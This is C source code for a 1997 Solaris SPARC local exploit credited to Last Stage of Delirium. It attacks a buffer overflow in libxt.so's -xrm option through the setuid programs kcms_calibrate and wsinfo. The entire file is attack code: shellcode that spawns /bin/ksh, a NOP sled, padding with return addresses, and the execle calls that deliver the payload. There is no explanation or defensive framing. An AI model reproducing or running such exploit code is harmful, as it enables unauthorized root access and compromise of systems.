/*## copyright LAST STAGE OF DELIRIUM sep 1997 poland        *://lsd-pl.net/ #*/
/*## libxt.so -xrm                                                           #*/

#define NOPNUM 3000
#define ADRNUM 3000
#define PCHNUM 3000
#define TMPNUM 3000

char shellcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh"
;

char jump[]=
    "\x81\xc3\xe0\x08"     /* jmp     %o7+8                */
    "\x90\x10\x00\x0e"     /* mov     %sp,%o0              */
;

static char nop[]="\x80\x1c\x40\x11";

main(int argc,char **argv){
    char buffer[15000],adr[4],pch[4],tmp[4],*b;
    int i,n=-1;

    printf("copyright LAST STAGE OF DELIRIUM sep 1997 poland  //lsd-pl.net/\n");
    printf("libxt.so -xrm for solaris 2.4 2.5 2.5.1 sparc\n\n");

    if(argc==1){
        printf("usage: %s {kcms_calibrate|wsinfo}\n",argv[0]);
        exit(-1);
    }
    if(!strcmp(argv[1],"kcms_calibrate")) n=0;
    if(!strcmp(argv[1],"wsinfo")) n=1;
    if(n==-1) exit(-1);

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()-116+1500+3000+6000;
    *((unsigned long*)pch)=(*(unsigned long(*)())jump)()-116+1500+3000;
    *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()-116+1500+3000+3000;

    b=buffer;
    for(i=0;i<PCHNUM;i++) *b++=pch[i%4];
    for(i=0;i<TMPNUM;i++) *b++=tmp[i%4];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    switch(n){
    case 0: execle("/usr/openwin/bin/kcms_calibrate","lsd","-xrm",buffer,0,0);
    case 1: execle("/usr/openwin/bin/wsinfo","lsd","-xrm",buffer,0,0);
    }
}

